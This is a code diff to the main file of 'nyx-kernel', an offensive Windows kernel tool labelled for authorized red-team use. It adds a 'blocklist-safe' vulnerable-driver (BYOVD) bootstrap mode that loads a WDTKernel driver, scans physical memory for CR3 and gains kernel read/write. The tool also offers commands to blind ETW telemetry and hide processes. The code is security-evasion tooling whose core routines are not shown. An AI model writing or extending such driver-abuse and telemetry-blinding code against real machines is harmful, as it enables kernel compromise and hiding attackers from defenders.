@@ -13,7 +13,7 @@
 //! reads/writes kernel memory. BSOD risk. **Authorized red-team use only.**
 //!
 //! # Usage (on the Windows target, admin cmd)
-//!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--flt-rva <hex>]
+//!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--flt-rva <hex>]
 //!   nyx-kernel assess   # real T4-T5 kernel assessment ({"assess":{...}} JSON line)
 //!   nyx-kernel blind-etw
 //!   nyx-kernel hide <pid>
@@ -110,24 +110,66 @@ fn main() {
     // Parse optional --byovd <sys> <svc>.
     let (byovd_sys, byovd_svc) = parse_byovd(&args);
 
-    // ---- 3. Bootstrap: KslD (default) → BYOVD fallback ----
-    eprintln!("[*] bootstrap_chain (KslD → BYOVD fallback)...");
-    let sys_utf16 = byovd_sys.as_ref().map(|s| to_utf16(s));
-    let svc_utf16 = byovd_svc.as_ref().map(|s| to_utf16(s));
-    let bootstrap = match unsafe {
-        win::bootstrap_chain(sys_utf16.as_deref(), svc_utf16.as_deref())
-    } {
-        Ok(b) => {
-            let kind = match &b {
-                win::KernelBootstrap::KslD(_) => "KslD",
-                win::KernelBootstrap::Byovd(_, _) => "BYOVD",
-            };
-            eprintln!("[+] bootstrap OK via {kind}");
-            b
+    // Parse optional --wdt <sys> (blocklist-safe phys-mode BYOVD) with
+    // optional --wdt-svc <name> (default WDTKernel).
+    let wdt_sys = parse_flag_string(&args, "--wdt");
+    let wdt_svc = parse_flag_string(&args, "--wdt-svc");
+
+    // ---- 3. Bootstrap: KslD (default) → BYOVD fallback / WDT phys mode ----
+    let bootstrap = if let Some(wdt_path) = &wdt_sys {
+        // WDT path: resolve ntoskrnl base DRIVERLESS first (CR3 validation
+        // needs a kernel VA to page-walk), then load WDTKernel → discover
+        // CR3 (physical scan + MZ gate) → wrap in VaKernelRw.
+        eprintln!("[*] WDT phys-mode bootstrap ({wdt_path})...");
+        let nt_base = match unsafe { win::kernel_base::ntoskrnl_base() } {
+            Ok(b) => b as u64,
+            Err(e) => {
+                eprintln!("[!] ntoskrnl base resolution failed: {e:?}");
+                std::process::exit(3);
+            }
+        };
+        let sys_u16 = to_utf16(wdt_path);
+        let svc_u16 = to_utf16(wdt_svc.as_deref().unwrap_or("WDTKernel"));
+        let scan_budget_mb = std::env::var("NYX_WDT_SCAN_MB")
+            .ok()
+            .and_then(|v| v.parse::<usize>().ok())
+            .unwrap_or(2048);
+        match unsafe {
+            win::wdt::bootstrap_wdt(
+                sys_u16.as_slice(),
+                svc_u16.as_slice(),
+                nt_base,
+                &eprocess,
+                scan_budget_mb,
+            )
+        } {
+            Ok((loaded, rw)) => {
+                eprintln!("[+] WDT bootstrap OK (cr3 discovered + MZ-validated)");
+                win::KernelBootstrap::Wdt(loaded, rw)
+            }
+            Err(e) => {
+                eprintln!("[!] wdt bootstrap failed: {e:?}");
+                std::process::exit(3);
+            }
         }
-        Err(e) => {
-            eprintln!("[!] bootstrap failed: {e:?}");
-            std::process::exit(3);
+    } else {
+        eprintln!("[*] bootstrap_chain (KslD → BYOVD fallback)...");
+        let sys_utf16 = byovd_sys.as_ref().map(|s| to_utf16(s));
+        let svc_utf16 = byovd_svc.as_ref().map(|s| to_utf16(s));
+        match unsafe { win::bootstrap_chain(sys_utf16.as_deref(), svc_utf16.as_deref()) } {
+            Ok(b) => {
+                let kind = match &b {
+                    win::KernelBootstrap::KslD(_) => "KslD",
+                    win::KernelBootstrap::Byovd(_, _) => "BYOVD",
+                    win::KernelBootstrap::Wdt(_, _) => "WDT",
+                };
+                eprintln!("[+] bootstrap OK via {kind}");
+                b
+            }
+            Err(e) => {
+                eprintln!("[!] bootstrap failed: {e:?}");
+                std::process::exit(3);
+            }
         }
     };
 
@@ -1047,7 +1089,7 @@ fn usage_text() -> &'static str {
     r#"usage: nyx-kernel <command> [args...]
 
 Commands:
-  bootstrap [--byovd <sys> <svc>] [--flt-rva <hex>]
+  bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--flt-rva <hex>]
   assess                   # real T4-T5 kernel assessment (prints {"assess":{...}} JSON line)
   blind-etw
   hide <pid>
@@ -1160,6 +1202,12 @@ fn to_utf16(s: &str) -> Vec<u16> {
 fn parse_flag_u32(args: &[String], flag: &str) -> Option<u32> {
     let idx = args.iter().position(|a| a == flag)?;
     args.get(idx + 1)?.trim_start_matches("0x").parse().ok()
+}
+
+#[cfg(target_os = "windows")]
+fn parse_flag_string(args: &[String], flag: &str) -> Option<String> {
+    let idx = args.iter().position(|a| a == flag)?;
+    args.get(idx + 1).cloned()
 }
 
 #[cfg(target_os = "windows")]
